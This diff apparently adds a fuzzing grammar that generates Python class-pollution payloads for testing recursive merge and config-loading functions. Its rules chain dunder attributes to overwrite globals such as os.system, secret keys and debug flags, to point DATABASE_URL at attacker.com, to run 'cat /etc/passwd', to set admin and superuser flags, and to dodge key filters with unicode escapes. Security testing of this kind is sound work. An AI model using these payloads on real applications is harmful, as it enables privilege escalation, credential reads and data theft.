@@ -1,0 +1,83 @@
+!root <pollution_input>
+!max_depth 6
+
+<pollution_input> = {"merge_fn":<merge_fn>,"payload":<payload>}
+
+<merge_fn> = "recursive_merge"
+<merge_fn> = "recursive_merge_filtered"
+<merge_fn> = "setattr_loop"
+<merge_fn> = "dict_update_recursive"
+<merge_fn> = "pydantic_validate"
+<merge_fn> = "omegaconf_merge"
+<merge_fn> = "attrs_structure"
+<merge_fn> = "pyyaml_safe_merge"
+
+<payload> = <globals_chain>
+<payload> = <class_attr_chain>
+<payload> = <bases_chain>
+<payload> = <dict_chain>
+<payload> = <shallow_dunder>
+<payload> = <nested_chain>
+
+<globals_chain> = {"__class__":{"__init__":{"__globals__":{<globals_target>}}}}
+<globals_target> = "os":{"system":"id"}
+<globals_target> = "os":{"environ":{"PATH":"/tmp/evil"}}
+<globals_target> = "SECRET_KEY":"pwned"
+<globals_target> = "DEBUG":true
+<globals_target> = "__builtins__":{"eval":"REPLACED"}
+<globals_target> = "subprocess":{"call":"REPLACED"}
+<globals_target> = "sys":{"path":[".","/tmp/evil"]}
+<globals_target> = "config":{"SECRET_KEY":"pwned","DEBUG":true}
+<globals_target> = "ALLOWED_HOSTS":["*"]
+<globals_target> = "DATABASE_URL":"postgresql://evil:evil@attacker.com/db"
+<globals_target> = "MIDDLEWARE":["evil_middleware"]
+<globals_target> = "INSTALLED_APPS":["evil_app"]
+<globals_target> = "LOGGING":{"handlers":{"evil":{"class":"REPLACED"}}}
+<globals_target> = "ctypes":{"cdll":{"LoadLibrary":"evil.so"}}
+<globals_target> = "pickle":{"loads":"REPLACED"}
+<globals_target> = "importlib":{"import_module":"REPLACED"}
+
+<class_attr_chain> = {"__class__":{<class_target>}}
+<class_target> = "admin":true
+<class_target> = "is_admin":true
+<class_target> = "_is_superuser":true
+<class_target> = "role":"admin"
+<class_target> = "is_authenticated":true
+<class_target> = "debug":true
+<class_target> = "allowed":true
+<class_target> = "secret_key":"pwned"
+<class_target> = "permissions":["admin","write","delete"]
+<class_target> = "level":9999
+<class_target> = "_password_hash":"$2b$12$evil"
+<class_target> = "email_verified":true
+<class_target> = "is_staff":true
+<class_target> = "groups":["admin","superadmin"]
+
+<bases_chain> = {"__class__":{"__bases__":{"0":{<class_target>}}}}
+<bases_chain> = {"__class__":{"__mro__":{"1":{<class_target>}}}}
+
+<dict_chain> = {"__dict__":{<class_target>}}
+<dict_chain> = {"__class__":{"__dict__":{<class_target>}}}
+
+<shallow_dunder> = {"__class__":"replaced"}
+<shallow_dunder> = {"__init__":null}
+<shallow_dunder> = {"__reduce__":null}
+<shallow_dunder> = {"__setattr__":null}
+
+<nested_chain> = {"__class__":{"__init__":{"__globals__":{"__builtins__":{"__import__":"REPLACED"}}}}}
+<nested_chain> = {"__class__":{"__bases__":{"0":{"__init__":{"__globals__":{<globals_target>}}}}}}
+<nested_chain> = {"__class__":{"__init__":{"__globals__":{"os":{"system":"id","popen":"cat /etc/passwd"}}}}}
+<nested_chain> = {"__class__":{"__subclasses__":{"0":{"__init__":{"__globals__":{<globals_target>}}}}}}
+<nested_chain> = {"__class__":{"__mro__":{"2":{"__init__":{"__globals__":{<globals_target>}}}}}}
+
+<payload> = <filter_bypass>
+<filter_bypass> = {"\u005f\u005fclass\u005f\u005f":{<class_target>}}
+<filter_bypass> = {"\u005f\u005fclass\u005f\u005f":{"\u005f\u005finit\u005f\u005f":{"\u005f\u005fglobals\u005f\u005f":{<globals_target>}}}}
+<filter_bypass> = {"__class__":{"__init\u005f\u005f":{"__globals__":{<globals_target>}}}}
+
+<payload> = <value_variant>
+<value_variant> = {"__class__":{"admin":"true"}}
+<value_variant> = {"__class__":{"admin":"1"}}
+<value_variant> = {"__class__":{"admin":1}}
+<value_variant> = {"__class__":{"admin":[]}}
+<value_variant> = {"__class__":{"admin":null}}
